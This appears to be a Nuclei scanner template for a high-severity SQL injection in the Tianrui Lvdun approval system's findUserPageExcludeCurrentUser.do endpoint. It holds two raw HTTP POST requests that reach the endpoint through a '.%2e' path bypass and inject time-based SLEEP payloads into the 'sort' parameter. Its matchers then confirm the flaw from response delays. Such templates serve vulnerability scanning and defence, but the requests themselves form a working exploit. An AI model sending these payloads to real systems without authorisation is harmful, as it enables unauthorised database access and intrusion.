id: tianrui-findUserPageExcludeCurrentUser-sql

info:
  name: 天锐绿盾审批系统 findUserPageExcludeCurrentUser.do SQL注入漏洞
  author: tianrui
  severity: high
  tags: tianrui

http:
  - raw:
      - |
        POST /trwfe/login.jsp/.%2e/user/findUserPageExcludeCurrentUser.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Content-Type: application/x-www-form-urlencoded

        deptId=1&sort=a.ID_%20OR+(SELECT+1183+FROM+(SELECT(SLEEP(2)))UPad)

      - |
        POST /trwfe/login.jsp/.%2e/user/findUserPageExcludeCurrentUser.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Content-Type: application/x-www-form-urlencoded

        deptId=1&sort=a.ID_%20OR+(SELECT+1183+FROM+(SELECT(SLEEP(4)))UPad)

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1>=2 && duration_1<4'  
          - 'duration_2>=4 && duration_2<6'
        condition: and

